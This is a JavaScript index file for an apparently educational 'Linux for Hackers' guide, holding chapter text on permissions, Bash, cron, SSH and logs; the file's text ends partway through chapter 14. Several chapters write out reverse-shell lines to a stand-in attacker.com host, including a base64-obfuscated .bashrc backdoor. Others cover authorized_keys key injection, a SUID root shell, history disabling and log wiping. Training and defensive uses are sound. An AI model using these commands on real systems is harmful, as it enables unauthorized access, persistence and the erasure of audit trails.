
window["0XMAP_GUIDE"] = {"version":4,"parts":[{"id":"foundations","num":"01","name":"Foundations","blurb":"Files, permissions, accounts and the shell."},{"id":"shell","num":"02","name":"Shell and scheduling","blurb":"Arguments, environment, processes and scheduled execution."},{"id":"access","num":"03","name":"Access and network","blurb":"PATH, logs, interfaces, firewalls and remote access."},{"id":"persistence","num":"04","name":"Persistence and isolation","blurb":"Persistence, daemons, capabilities, containers and monitoring."},{"id":"defense","num":"05","name":"Defense and workflow","blurb":"Forensics, automation, hardening, sniffing and memory."}],"chapters":[{"kind":"chapter","number":1,"order":1,"href":"chapters/01-introduction-and-why-linux-matters-in-hacking.html","slug":"01-introduction-and-why-linux-matters-in-hacking","page":"01-introduction-and-why-linux-matters-in-hacking.html","title":"Introduction and Why Linux Matters in Hacking","short":"Why Linux matters","summary":"Set up the lab and learn why Linux sits at the center of offensive security.","part":"foundations","partNum":"01","partName":"Foundations","readMinutes":2,"words":172,"sections":4,"codeBlocks":1,"headings":[{"id":"what-is-new-in-this-edition","text":"What is new in this edition","level":2},{"id":"why-linux","text":"Why Linux?","level":2},{"id":"practice-task","text":"Practice Task","level":2},{"id":"explanation","text":"Explanation","level":2}],"text":"Welcome to the complete Linux for Hackers guide. What is new in this edition This edition adds modern coverage of the Linux attack surface: eBPF runtime security, Landlock and seccomp, nftables and XDP, software supply chain attacks, current container escapes, SSH certificate and FIDO2 authentication, and modern DFIR tooling. The new material is written for labs and authorized testing. Patch levels and kernel features change quickly, so verify versions against the vendor advisory before relying on a technique. Why Linux? Linux is the primary OS used in cybersecurity, ethical hacking, and penetration testing. Mastering it is non-negotiable if you aim to: Use tools like nmap, hydra, metasploit, burp suite, etc. Automate with Bash and Python Navigate CTFs and red team scenarios efficiently Work with servers and exploit environments Practice Task Install Kali Linux (on VM or system) Open the terminal and run: whoami uname -a pwd Research what each command does. Explanation whoami: Displays your current logged-in user uname -a: Shows kernel version, system name, hardware info pwd: Prints your current directory"},{"kind":"chapter","number":2,"order":2,"href":"chapters/02-basic-file-navigation-in-linux.html","slug":"02-basic-file-navigation-in-linux","page":"02-basic-file-navigation-in-linux.html","title":"Basic File Navigation in Linux","short":"File navigation","summary":"Move through the filesystem and inspect files with the core navigation commands.","part":"foundations","partNum":"01","partName":"Foundations","readMinutes":2,"words":138,"sections":1,"codeBlocks":4,"headings":[{"id":"key-commands","text":"Key Commands","level":2}],"text":"This chapter focuses on navigating the Linux file system - a critical skill for any hacker. Key Commands ls # List contents of a directory cd # Change directory pwd # Show current directory path clear # Clear terminal screen tree # Display directory structure clear # Clear terminal screen history # View command history Practice Task Open your terminal Try the following: cd / ls cd etc pwd cd ~ ls -la Observe how directories are organized Use tree to visualize the structure (install it if not available): sudo apt install tree tree /home Linux Directory Breakdown /etc Configuration files /var Logs, web files, variable data /home User directories /tmp Temporary storage (often writable by all users) /root Home directory of the root user These directories are often involved in privilege escalation or persistence in real-world attacks."},{"kind":"chapter","number":3,"order":3,"href":"chapters/03-understanding-linux-file-permissions.html","slug":"03-understanding-linux-file-permissions","page":"03-understanding-linux-file-permissions.html","title":"Understanding Linux File Permissions","short":"File permissions","summary":"Read permission bits, change modes and spot risky access on files and directories.","part":"foundations","partNum":"01","partName":"Foundations","readMinutes":3,"words":196,"sections":1,"codeBlocks":6,"headings":[{"id":"file-permission-breakdown","text":"File Permission Breakdown","level":2}],"text":"In hacking and cybersecurity, file permissions can either stop you cold or be the door you walk through. Misconfigured permissions often lead to privilege escalation or information disclosure. File Permission Breakdown Run: ls -l Example output: -rwxr-xr-- 1 user group 1337 Jan 1 exploit.sh Explanation: - → regular file (d = directory, l = symlink) rwx → owner can read, write, execute r-x → group can read, execute r-- → others can only read Permission Notation There are two formats: Symbolic Octal Meaning rwxr-xr-- 754 Owner: all, Group: rx, Others: r rwxrwxrwx 777 Full access to everyone (dangerous) Use this table when setting permissions using chmod. Key Commands chmod +x file # Add execute permission chmod 755 file # Set rwxr-xr-x chown user:group file # Change file ownership Practice Task Create a basic script: echo 'echo hacked' > test.sh chmod +x test.sh ./test.sh Try changing permissions: chmod 777 test.sh ls -l Modify ownership (you might need sudo): sudo chown root:root test.sh Real-World Hacking Example In many real-world scenarios: A root-owned script with group-writable access → potential escalation Misconfigured crontabs (/etc/cron.d/) running user-editable scripts = root shell Understanding permissions is not optional - it's a hacker's tool."},{"kind":"chapter","number":4,"order":4,"href":"chapters/04-users-groups-and-privilege-escalation-basics.html","slug":"04-users-groups-and-privilege-escalation-basics","page":"04-users-groups-and-privilege-escalation-basics.html","title":"Users, Groups, and Privilege Escalation Basics","short":"Users and groups","summary":"Understand accounts, group membership and the first paths to higher privilege.","part":"foundations","partNum":"01","partName":"Foundations","readMinutes":3,"words":201,"sections":3,"codeBlocks":5,"headings":[{"id":"user-overview","text":"User Overview","level":2},{"id":"group-overview","text":"Group Overview","level":3},{"id":"key-security-related-groups","text":"Key Security-Related Groups","level":3}],"text":"Understanding how users and groups function in Linux is crucial for both defending and attacking systems. Every privilege escalation scenario starts with knowing who you are and what you can access. User Overview Each user has a (user ID). root = UID 0 Normal users = UID 1000+ Defined in /etc/passwd Home directories usually under /home/username Check your user: whoami id Group Overview Groups define permissions for collections of users Primary group = assigned when user is created Supplementary groups = additional privileges See your groups: groups Key Security-Related Groups Group Why It Matters sudo Can execute root commands docker Possible container breakout adm Access to logs (can contain creds) lxd Launch root containers with images shadow Read password hashes (if misconfigured) Practice Task Run: whoami id groups sudo -l Review your group memberships Check what sudo commands (if any) you can run without a password Real-World Attack Scenarios User is in sudo group → escalate via sudo su Docker group → create container with mounted host → root shell Sudo misconfig (NOPASSWD): (ALL : ALL) NOPASSWD: ALL You can run anything as root with: sudo /bin/bash The next chapter covers package managers and how they can be abused or weaponized."},{"kind":"chapter","number":5,"order":5,"href":"chapters/05-linux-package-managers-and-dependency-abuse.html","slug":"05-linux-package-managers-and-dependency-abuse","page":"05-linux-package-managers-and-dependency-abuse.html","title":"Linux Package Managers and Dependency Abuse","short":"Package managers","summary":"Work with APT and turn package and dependency behavior into an attack surface.","part":"foundations","partNum":"01","partName":"Foundations","readMinutes":5,"words":568,"sections":7,"codeBlocks":8,"headings":[{"id":"what-is-a-package-manager","text":"What Is a Package Manager?","level":2},{"id":"key-commands-apt-based-distros","text":"Key Commands (APT-based distros)","level":2},{"id":"inspect-installed-packages","text":"Inspect Installed Packages","level":3},{"id":"attacker-use-cases","text":"Attacker Use Cases","level":3},{"id":"practice-task","text":"Practice Task","level":3},{"id":"red-team-example","text":"Red Team Example","level":3},{"id":"advanced-modern-software-supply-chain-attacks","text":"Advanced: Modern software supply chain attacks","level":2}],"text":"Package managers are central to Linux systems - and are a potential goldmine for attackers. This lesson covers how they work and how they're abused in real-world hacks. What Is a Package Manager? A package manager handles: Installation and removal of software Dependency resolution System software updates Different distros use different managers: apt → Debian-based (Ubuntu, Kali) yum or dnf → RedHat, Fedora pacman → Arch Linux Key Commands (APT-based distros) sudo apt update # Refresh package lists sudo apt upgrade # Update all packages sudo apt install \u003ctool> # Install software sudo apt remove \u003ctool> # Uninstall dpkg -l # List installed packages Search and list packages: dpkg -l | grep ssh Inspect Installed Packages which nmap # Path to binary dpkg -L nmap # List files installed by a package Attacker Use Cases Technique Description Dependency Hijacking Create a malicious .deb file with the same name as a trusted library or dependency Backdoored .deb Files Add preinst/postinst scripts to run payloads during install Persistence via Updates Fake update packages that re-deploy backdoors during upgrades Hijacking Local Repos If the system pulls from a local mirror, inject payloads via a fake repository Practice Task 1 - Install and inspect a tool: sudo apt install netcat which nc dpkg -L netcat 2 - Find scripts run during install: ls -l /var/lib/dpkg/info/netcat*.* 3 - Look inside: cat /var/lib/dpkg/info/netcat.postinst Red Team Example A fake .deb package containing: postinst: bash -i >& /dev/tcp/attacker.com/4444 0>&1 When installed, it gives an attacker a reverse shell. Advanced: Modern software supply chain attacks Package managers are now a primary supply chain target. The 2024 xz/liblzma backdoor (CVE-2024-3094) showed how a trusted upstream maintainer account and release tarballs could inject code into a library used by sshd on several distributions. The malicious code existed in the build system and release artifacts, not in the visible Git history. The lesson is broader than one CVE: a signed distribution package is not proof that every upstream release was reviewed. Modern attack patterns: Dependency confusion: a private package name resolves to a public registry package. Typosquatting and brandjacking: a name that is one character away from a trusted package. Malicious install hooks: postinst, setup.py, npm install scripts and PKGBUILD functions run with your privileges. Compromised maintainer accounts and release automation. Unpinned transitive dependencies that change between builds. Verification workflow: # Inventory installed packages dpkg-query -W -f='${Package} ${Version}\\n' | sort rpm -qa --qf '%{NAME} %{VERSION}-%{RELEASE}\\n' | sort # Check file integrity against package metadata sudo debsums -c sudo rpm -Va # Generate an SBOM and scan dependencies syft dir:. -o spdx-json > sbom.spdx.json osv-scanner scan source -r . trivy fs --scanners vuln,secret,misconfig . # Verify a signed artifact (key-based) cosign verify-blob --key cosign.pub --signature artifact.sig artifact Defensive controls: Commit lockfiles and use npm ci, pip install --require-hashes, or cargo build --locked. Review install hooks before running package installation as root on a production host. Use signed repositories, SBOMs in SPDX or CycloneDX format, and provenance attestations such as SLSA and in-toto. Build in a disposable environment and compare the result with a reproducible build. Treat a new dependency as code you are about to run as root. Lab task: pick a small Python or Node project, generate an SBOM, run an OSV scan, and identify one transitive dependency that is not pinned. Do not test malicious packages. The next chapter begins scripting with Bash, your tool for automation and post-exploitation."},{"kind":"chapter","number":6,"order":6,"href":"chapters/06-introduction-to-bash-scripting.html","slug":"06-introduction-to-bash-scripting","page":"06-introduction-to-bash-scripting.html","title":"Introduction to Bash Scripting","short":"Bash scripting","summary":"Build small Bash scripts and use variables, control flow and arguments with intent.","part":"foundations","partNum":"01","partName":"Foundations","readMinutes":2,"words":216,"sections":5,"codeBlocks":4,"headings":[{"id":"why-bash","text":"Why Bash?","level":2},{"id":"simple-bash-script-example","text":"Simple Bash Script Example","level":2},{"id":"key-bash-concepts","text":"Key Bash Concepts","level":2},{"id":"practice-task","text":"Practice Task","level":2},{"id":"real-world-usage","text":"Real-World Usage","level":2}],"text":"Bash scripting is a critical skill in offensive security. Whether you're automating recon, building post-exploitation payloads, or chaining tools together - Bash is your friend. Why Bash? Available on almost every Linux system Lightweight and fast Great for quick automations and on-the-fly modifications Can run commands silently, log output, and chain complex attacks Simple Bash Script Example #!/bin/bash echo \"[+] Starting Recon...\" whoami ip a Save as recon.sh, then: chmod +x recon.sh ./recon.sh Key Bash Concepts Concept Description #!/bin/bash Shebang: tells Linux how to execute the file echo Prints output $(command) Executes a shell command $1, $2 Access arguments passed to the script > / >> Redirect output to file (overwrite / append) | pipe output to another command Practice Task Create a file scan.sh with: #!/bin/bash echo \"[*] User Info:\" whoami echo \"[*] System IP:\" ip a | grep inet echo \"[*] Listening Ports:\" ss -tuln Execute it: chmod +x scan.sh ./scan.sh Modify it: Add hostname, uptime, or any info you want to auto-collect Real-World Usage After exploitation, you want: Quick system inventory Logged output of recon A quiet way to run tools in sequence Instead of typing all that manually, you just drop a loot.sh. The next chapter breaks down variables, input arguments, and how to build dynamic Bash scripts used in real operations."},{"kind":"chapter","number":7,"order":7,"href":"chapters/07-bash-variables-arguments-and-dynamic-scripting.html","slug":"07-bash-variables-arguments-and-dynamic-scripting","page":"07-bash-variables-arguments-and-dynamic-scripting.html","title":"Bash Variables, Arguments and Dynamic Scripting","short":"Bash variables","summary":"Pass data into scripts and shape commands at runtime with variables and arguments.","part":"shell","partNum":"02","partName":"Shell and scheduling","readMinutes":3,"words":202,"sections":3,"codeBlocks":7,"headings":[{"id":"why-use-variables","text":"Why Use Variables?","level":2},{"id":"real-use-case","text":"Real Use Case","level":2},{"id":"let-s-say-you-want-to","text":"Let’s say you want to:","level":3}],"text":"To go beyond static scripts, you must master variables and arguments in Bash. These tools turn one-off commands into scalable, repeatable, dynamic payloads and automation tools. Why Use Variables? Variables allow you to store data (like usernames, ports, IPs, payloads) and reference them throughout your script. Example: name=\"CyberSec\" echo \"Welcome, $name!\" Script Arguments: $1, $2, $@ When running scripts, you can pass in values externally: #!/bin/bash echo \"User: $1\" echo \"Password: $2\" Run with: ./login.sh admin admin123 Symbol Meaning $1 First argument $2 Second argument $@ All arguments With Loops Example script: multi_ping.sh #!/bin/bash for ip in \"$@\"; do echo \"Pinging $ip...\" ping -c 1 $ip done Run it: ./multi_ping.sh 192.168.1.1 192.168.1.2 192.168.1.3 Practice Task Build a script called enum.sh: #!/bin/bash target=$1 echo \"[*] Running scan on $target\" nmap -Pn -sS $target Make it executable: chmod +x enum.sh ./enum.sh 10.10.10.10 Extend it to accept port ranges or scripts Real Use Case Let’s say you want to: Auto-recon targets from a list Brute-force web login pages Drop backdoors on multiple IPs With $1, $2, $@, and for loops - your Bash script becomes multi-target, adaptable, and scalable. The next chapter looks at environment variables, .bashrc abuse, and how attackers persist through shell manipulation."},{"kind":"chapter","number":8,"order":8,"href":"chapters/08-environment-variables-and-bashrc-abuse.html","slug":"08-environment-variables-and-bashrc-abuse","page":"08-environment-variables-and-bashrc-abuse.html","title":"Environment Variables and .bashrc Abuse","short":"Shell startup abuse","summary":"See how shell startup files and environment variables become persistence and evasion.","part":"shell","partNum":"02","partName":"Shell and scheduling","readMinutes":3,"words":233,"sections":6,"codeBlocks":7,"headings":[{"id":"what-are-environment-variables","text":"What Are Environment Variables?","level":2},{"id":"why-this-matters-in-hacking","text":"Why This Matters in Hacking","level":2},{"id":"bash-startup-files","text":"Bash Startup Files","level":2},{"id":"persistence-with-bashrc","text":"Persistence with .bashrc","level":2},{"id":"practice-task","text":"Practice Task","level":3},{"id":"red-team-blue-team-tips","text":"Red Team + Blue Team Tips","level":2}],"text":"Environment variables define the execution context of Linux shells. But in hacking, they can be used to hide payloads, manipulate system behavior, or establish persistence. What Are Environment Variables? Use these commands to list or reference variables: printenv env echo $HOME echo $PATH Variable Purpose $PATH Defines where binaries are searched $USER Current user $HOME User's home directory $SHELL Default shell $HISTFILE Shell history file path Why This Matters in Hacking You can override $PATH to run your own malicious binaries You can disable shell history: export HISTFILE=/dev/null You can leak system info using environment variables Bash Startup Files File Trigger ~/.bashrc On each interactive shell ~/.bash_profile On login /etc/profile System-wide login config Persistence with .bashrc Inject a backdoor: echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> ~/.bashrc Or hide it in a more stealthy way: echo \"eval \\$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx | base64 -d)\" >> ~/.bashrc On next terminal session? Backdoor triggers. Practice Task View .bashrc: cat ~/.bashrc Add a harmless test: echo 'echo \"Hacked by $USER on $(date)\"' >> ~/.bashrc Open a new terminal and observe. To clean it: nano ~/.bashrc Red Team + Blue Team Tips Use Case Technique Persistence Append payload to .bashrc Log wiping Set $HISTFILE=/dev/null Evasion Use base64 + eval IR / Forensics Always check .bashrc, .profile, /etc/profile for unusual entries The next chapter covers processes and services, and how hackers use ps, top, and systemctl to enumerate and escalate."},{"kind":"chapter","number":9,"order":9,"href":"chapters/09-processes-services-and-enumeration.html","slug":"09-processes-services-and-enumeration","page":"09-processes-services-and-enumeration.html","title":"Processes, Services and Enumeration","short":"Processes and services","summary":"Enumerate running processes, open services and the signals behind them.","part":"shell","partNum":"02","partName":"Shell and scheduling","readMinutes":4,"words":273,"sections":6,"codeBlocks":9,"headings":[{"id":"what-is-a-process","text":"What Is a Process?","level":2},{"id":"key-commands","text":"Key Commands","level":2},{"id":"process-enumeration-for-hackers","text":"Process Enumeration for Hackers","level":2},{"id":"real-world-escalation-scenario","text":"Real-World Escalation Scenario","level":2},{"id":"practice-task","text":"Practice Task","level":2},{"id":"red-team-notes","text":"Red Team Notes","level":2}],"text":"Linux systems run thousands of processes and services - and every single one is a potential attack surface or persistence point. What Is a Process? A process is a running instance of a command or application. You can list, monitor, or kill processes - or abuse them. Run: ps aux Key Commands Command Purpose ps aux List all system processes top Real-time CPU/mem monitor htop Enhanced top UI (needs install) systemctl list-units List running services systemctl status View status/details of a service ss -tuln Show open ports/listening services Process Enumeration for Hackers When you compromise a box, use: ps aux | grep -v nobody Things to look for: Processes running as root Scripts with full paths (/home/user/script.py) Sensitive args (e.g., mysql -u root -p\u003cpassword>) Writable scripts or binaries owned by root Cron jobs or background services (systemctl, crontab, /etc/init.d/) Real-World Escalation Scenario 1- Find a process: python3 /opt/app/server.py 2- Check permissions: ls -l /opt/app/server.py 3- If writable: echo \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\" >> /opt/app/server.py 4- Wait for service restart or trigger it with: sudo systemctl restart server Practice Task 1- List running processes and highlight those owned by root ps aux | grep root 2- Install and use htop for visualization: sudo apt install htop htop 3- Enumerate services: systemctl list-units --type=service 4- Find writable or poorly configured services/scripts Red Team Notes Vector Example Writable service script Escalate on service restart Credential in command-line args Leak via ps Reverse shell in .bashrc Triggered by login shell Cron job overwrite Persistence The next chapter examines cron jobs and how they can be exploited or used for persistence. #linux #privilegeescalation #processes #systemctl #redteam #hacking"},{"kind":"chapter","number":10,"order":10,"href":"chapters/10-cron-jobs-scheduled-tasks-and-exploitation.html","slug":"10-cron-jobs-scheduled-tasks-and-exploitation","page":"10-cron-jobs-scheduled-tasks-and-exploitation.html","title":"Cron Jobs: Scheduled Tasks and Exploitation","short":"Cron jobs","summary":"Read cron schedules, audit writable jobs and understand scheduled execution.","part":"shell","partNum":"02","partName":"Shell and scheduling","readMinutes":4,"words":257,"sections":7,"codeBlocks":9,"headings":[{"id":"what-is-cron","text":"What Is Cron?","level":2},{"id":"cron-syntax","text":"Cron Syntax","level":2},{"id":"exploitation-scenarios","text":"Exploitation Scenarios","level":2},{"id":"real-attack-example","text":"Real Attack Example","level":2},{"id":"practice-task","text":"Practice Task","level":2},{"id":"blue-team-tip","text":"Blue Team Tip","level":2},{"id":"tags","text":"Tags","level":2}],"text":"Cron is a Linux utility that schedules tasks to run at fixed intervals. For attackers, it can be used to gain persistence, escalate privileges, or maintain control. What Is Cron? Cron jobs are scheduled scripts/commands that run automatically. System-wide cron files: /etc/crontab /etc/cron.d/ User-specific jobs: crontab -e /var/spool/cron/\u003cuser> Cron Syntax * * * * * /path/to/command │ │ │ │ │ │ │ │ │ └─ Day of week (0-6) │ │ │ └─── Month (1-12) │ │ └───── Day of month (1-31) │ └─────── Hour (0-23) └───────── Minute (0-59) Exploitation Scenarios Scenario Explanation Writable cron script Inject reverse shell into it User cron with root context Schedule backdoor or enumeration Frequent execution Can be used as an execution loop Logs not monitored Hard to detect persistent jobs Real Attack Example If you find: */1 * * * * root /opt/cleaner.sh And: ls -l /opt/cleaner.sh Shows it’s writable, then: echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /opt/cleaner.sh → Root shell every minute! Practice Task List current crons: crontab -l Add a test job: crontab -e Insert: */1 * * * * echo \"Executed at $(date)\" >> /tmp/cron_output.txt Wait a minute and check output: cat /tmp/cron_output.txt View system-wide crons: cat /etc/crontab ls -la /etc/cron.d/ Blue Team Tip Always inspect cron jobs as part of incident response Check for: Unexpected scripts Malicious payloads External connections Frequent executions with unknown origin The next chapter explores SSH (Secure Shell): not just how it works, but how to abuse keys and configs and hijack sessions. Tags #linux #cron #persistence #redteam #infosec #privilegeescalation"},{"kind":"chapter","number":11,"order":11,"href":"chapters/11-ssh-access-and-abuse.html","slug":"11-ssh-access-and-abuse","page":"11-ssh-access-and-abuse.html","title":"SSH: Secure Shell Access and Abuse","short":"SSH access and abuse","summary":"Inspect SSH keys, configs and authorization files, then review the defensive controls.","part":"shell","partNum":"02","partName":"Shell and scheduling","readMinutes":6,"words":453,"sections":10,"codeBlocks":14,"headings":[{"id":"what-is-ssh","text":"What is SSH?","level":2},{"id":"ssh-key-files","text":"SSH Key Files","level":2},{"id":"attacker-use-cases","text":"Attacker Use Cases","level":2},{"id":"1-steal-and-use-keys","text":"1. Steal and Use Keys","level":3},{"id":"2-persistent-backdoor-via-key-injection","text":"2. Persistent Backdoor via Key Injection","level":3},{"id":"3-check-ssh-config-for-weaknesses","text":"3. Check SSH Config for Weaknesses","level":3},{"id":"practice-task","text":"Practice Task","level":2},{"id":"advanced-modern-ssh-attack-surface-and-identity","text":"Advanced: Modern SSH attack surface and identity","level":2},{"id":"red-team-notes","text":"Red Team Notes","level":2},{"id":"tags","text":"Tags","level":2}],"text":"SSH is the backbone of remote Linux access. But if mishandled, it can be exploited for persistence, lateral movement, and privilege escalation. What is SSH? SSH (Secure Shell) lets users log in to remote machines securely over a network. Typical usage: ssh user@host SSH Key Files File Purpose ~/.ssh/id_rsa Private key ~/.ssh/id_rsa.pub Public key ~/.ssh/authorized_keys Contains keys allowed to log in Attacker Use Cases 1. Steal and Use Keys Find private keys on the system: find / -name id_rsa 2>/dev/null Use a found key: chmod 600 id_rsa ssh -i id_rsa user@host 2. Persistent Backdoor via Key Injection After compromising a system: cat attacker_key.pub >> ~/.ssh/authorized_keys You now have passwordless, undetectable access. 3. Check SSH Config for Weaknesses View: cat /etc/ssh/sshd_config Look for: PermitRootLogin yes PasswordAuthentication yes These settings can allow brute-force or root login vectors. Practice Task Generate SSH Key: ssh-keygen View contents: cat ~/.ssh/id_rsa.pub Copy key to remote machine: ssh-copy-id user@remote-ip Or append manually: cat id_rsa.pub >> ~/.ssh/authorized_keys Test login: ssh user@remote-ip Advanced: Modern SSH attack surface and identity OpenSSH remains a high-value target. CVE-2024-6387 (\"regreSSHion\") is a signal-handler race in sshd that can lead to unauthenticated remote code execution on glibc-based systems. It affected OpenSSH 8.5p1 through 9.7p1 and was fixed in 9.8p1. CVE-2024-6409 is a related race in the privileged child on some builds. Patch, restart sshd and reduce exposure. Setting LoginGraceTime 0 removes the race window but makes the daemon easier to exhaust, so use it only as a temporary mitigation. Modern authentication: Prefer short-lived SSH certificates over long-lived authorized_keys entries. Use hardware-backed keys such as sk-ssh-ed25519@openssh.com with verify-required. Put a bastion or ProxyJump in front of internal hosts. Use AuthorizedKeysCommand with AuthorizedKeysCommandUser for directory-backed keys. Disable password and keyboard-interactive authentication on internet-facing hosts. Audit and harden: ssh -V sudo sshd -T | grep -Ei 'permitrootlogin|passwordauthentication|kbdinteractive|maxauthtries|logingracetime|allowtcpforwarding|x11forwarding' ssh-audit -p 22 192.0.2.10 sudo sshd -t sudo systemctl restart ssh Certificate workflow: ssh-keygen -t ed25519 -f ca -C \"lab ssh ca\" ssh-keygen -t ed25519 -f alice -C \"alice@lab\" ssh-keygen -s ca -I alice -n alice -V +8h alice.pub ssh -i alice alice@192.0.2.10 Hardening baseline, adjusted for legitimate tunnels: PermitRootLogin no PasswordAuthentication no KbdInteractiveAuthentication no MaxAuthTries 3 LoginGraceTime 20 AllowTcpForwarding no X11Forwarding no PermitTunnel no Prefer ProxyJump over ad-hoc port forwards for administrative access: ssh -J bastion.example.com internal.example.com ssh -D 127.0.0.1:1080 bastion.example.com ssh -L 127.0.0.1:8443:internal.example.com:443 bastion.example.com Detection: alert on failed authentication bursts, new keys in authorized_keys, sshd restarts and unusual sshd child processes. journalctl -u ssh, lastb and ss -tnp are starting points, not a complete detection stack. Red Team Notes Goal Action Persist on compromised host Inject key into authorized_keys Find lateral movement Look for .ssh/known_hosts Discover reused keys Reuse id_rsa on other targets Tags #linux #ssh #persistence #redteam #infosec #pentesting #hacking"},{"kind":"chapter","number":12,"order":12,"href":"chapters/12-file-permissions-and-privilege-escalation-basics.html","slug":"12-file-permissions-and-privilege-escalation-basics","page":"12-file-permissions-and-privilege-escalation-basics.html","title":"File Permissions and Privilege Escalation Basics","short":"Permissions to privilege","summary":"Chain permission mistakes, SUID bits and weak ownership into privilege escalation.","part":"shell","partNum":"02","partName":"Shell and scheduling","readMinutes":4,"words":317,"sections":8,"codeBlocks":9,"headings":[{"id":"objective","text":"Objective","level":2},{"id":"1-understanding-file-permissions","text":"1. Understanding File Permissions","level":2},{"id":"permission-types","text":"Permission Types","level":3},{"id":"2-changing-permissions","text":"2. Changing Permissions","level":2},{"id":"3-privilege-escalation-via-misconfigured-permissions","text":"3. Privilege Escalation via Misconfigured Permissions","level":2},{"id":"a-world-writable-files","text":"a) World-Writable Files","level":3},{"id":"b-suid-sgid-bits","text":"b) SUID/SGID Bits","level":3},{"id":"4-pentester-tips","text":"4. Pentester Tips","level":2}],"text":"Objective Understand Linux file permissions in detail and how attackers (or penetration testers) can exploit them for privilege escalation. 1. Understanding File Permissions In Linux, every file and directory has three sets of permissions for three types of users: Owner (u) - The user who owns the file. Group (g) - Users in the file's group. Others (o) - All other users on the system. Permission Types r → read w → write x → execute Example output from ls -l: -rwxr-x--- 1 alice admin 1234 Aug 9 10:00 script.sh Here: Owner (alice) → rwx (read, write, execute) Group (admin) → r-x (read, execute) Others → --- (no permissions) 2. Changing Permissions You can change file permissions using the chmod command. chmod 755 file.txt # rwxr-xr-x chmod u+x script.sh # Add execute for owner chmod g-w file.txt # Remove write from group You can also use octal notation: 7 → rwx 6 → rw- 5 → r-x 4 → r-- 0 → --- Example: chmod 644 document.txt # Owner: rw-, Group: r--, Others: r-- 3. Privilege Escalation via Misconfigured Permissions a) World-Writable Files Files with chmod 777 can be modified by anyone - a serious security risk. Find them with: find / -type f -perm -0002 2>/dev/null b) SUID/SGID Bits These special permission bits allow a file to be executed with the privileges of the file’s owner or group. SUID: Run as file owner chmod u+s /path/to/file SGID: Run as file’s group chmod g+s /path/to/file List SUID binaries: find / -perm -4000 2>/dev/null Common SUID binaries attackers check: /bin/bash /bin/passwd /usr/bin/sudo /usr/bin/find If any of these are misconfigured, they can allow root shell execution. 4. Pentester Tips Check /etc/passwd and /etc/shadow for incorrect permissions. Watch for writable configuration files for services running as root. SUID-enabled binaries with unintended features can often be abused. Example exploit: # If /usr/bin/find is SUID root /usr/bin/find . -exec /bin/sh \\; -quit"},{"kind":"chapter","number":13,"order":13,"href":"chapters/13-environment-variables-and-path-hijacking.html","slug":"13-environment-variables-and-path-hijacking","page":"13-environment-variables-and-path-hijacking.html","title":"Environment Variables and PATH Hijacking","short":"PATH hijacking","summary":"Trace PATH resolution and learn how a writable search path becomes execution.","part":"access","partNum":"03","partName":"Access and network","readMinutes":2,"words":200,"sections":7,"codeBlocks":4,"headings":[{"id":"overview","text":"Overview","level":2},{"id":"1-what-are-environment-variables","text":"1. What Are Environment Variables?","level":2},{"id":"2-modifying-environment-variables","text":"2. Modifying Environment Variables","level":2},{"id":"3-security-risks-path-hijacking","text":"3. Security Risks - PATH Hijacking","level":2},{"id":"4-defensive-measures","text":"4. Defensive Measures","level":2},{"id":"5-pentester-tip","text":"5. Pentester Tip","level":2},{"id":"tags","text":"Tags","level":2}],"text":"Overview This chapter explores Linux environment variables, focusing on how they work, how attackers can abuse them, and how to protect against PATH hijacking. 1. What Are Environment Variables? Environment variables store configuration values used by processes and the shell. Example: echo $HOME echo $USER echo $PATH $HOME → The current user's home directory. $USER → The username of the logged-in user. $PATH → Directories the shell searches for executable files. 2. Modifying Environment Variables You can set or modify environment variables using: export VAR=value export PATH=$PATH:/opt/tools Persistent changes can be made in: ~/.bashrc (user-specific) /etc/profile (system-wide) 3. Security Risks - PATH Hijacking If an attacker can write to a directory listed before system binary paths in $PATH, they can replace legitimate commands with malicious ones. Example attack: echo -e '#!/bin/bash\\necho hacked' > /tmp/ls chmod +x /tmp/ls export PATH=/tmp:$PATH ls This will execute the fake ls instead of /bin/ls. 4. Defensive Measures Keep $PATH minimal and ordered with system binaries first (/usr/bin:/bin). Avoid writable directories in $PATH. Use absolute paths for critical scripts. 5. Pentester Tip When testing, check for: echo $PATH If you find writable directories in $PATH, it could lead to command execution. Tags #linux #hacking #pentesting #infosec"},{"kind":"chapter","number":14,"order":14,"href":"chapters/14-logs-and-system-auditing.html","slug":"14-logs-and-system-auditing","page":"14-logs-and-system-auditing.html","title":"Logs and System Auditing","short":"Logs and auditing","summary":"Find the logs that record access, authentication and system change.","part":"access","partNum":"03","partName":"Access and network","readMinutes":3,"words":359,"sections":7,"codeBlocks":6,"headings":[{"id":"objective","text":"Objective","level":2},{"id":"1-common-log-locations","text":"1. Common Log Locations","level":2},{"id":"some-examples","text":"Some Examples:","level":2},{"id":"2-enumerating-logs","text":"2. Enumerating Logs","level":2},{"id":"3-attacker-use-cases","text":"3. Attacker Use Cases","level":2},{"id":"4-practice-task","text":"4. Practice Task","level":2},{"id":"pentester-tip","text":"Pentester Tip","level":2}],"text":"Mastering Linux Logs: A Hidden Goldmine for Admins & Ethical Hackers Objective Learn how Linux logs activities, how to query them, and ways attackers might use or evade them. In the world of Linux, logging systems are often ignored-yet they hold the keys to diagnosing critical issues, uncovering security breaches, and tracing unauthorized access. For system administrators and cybersecurity professionals, logs provide the who, what, and why behind system failures and intrusions. For penetration testers and ethical hackers, logs are the digital fingerprints that can expose your activity. The most effective attacks leave no trace, making log manipulation a crucial skill. But before you can cover your tracks, you must deeply understand Linux’s logging architecture. With systemd now the standard in most Linux distributions, traditional syslog has been replaced by journalctl-a powerful yet often misunderstood tool. Whether you're defending a system or testing its resilience, mastering journalctl and modern logging techniques is essential for staying undetected and maintaining control. 1. Common Log Locations Path Description /var/log/auth.log Login attempts and sudo usage /var/log/syslog System-wide events and messages /var/log/kern.log Kernel-level debugging info journalctl Central log viewer on systemd Some Examples: Initial Reconnaissance journalctl -q -since “24 hours ago” -This command quietly retrieves the last 24 hours of logs. The -q flag suppresses informational messages, reducing the noise and potential traces of your activities. Investigating User Activities journalctl _UID=1000 -since “24 hours ago” -This reveals that user “air” (UID 1000) has been actively using the system and has used “sudo” several times. 2. Enumerating Logs grep \"Failed\" /var/log/auth.log # Identify failed logins tail -n 50 /var/log/syslog # View recent system messages journalctl -p err # Show only error-level logs Use timestamps to map attacker movement or detect anomalies. 3. Attacker Use Cases echo \"\" > /var/log/auth.log Timestamp fuzzing: Setting incorrect system time 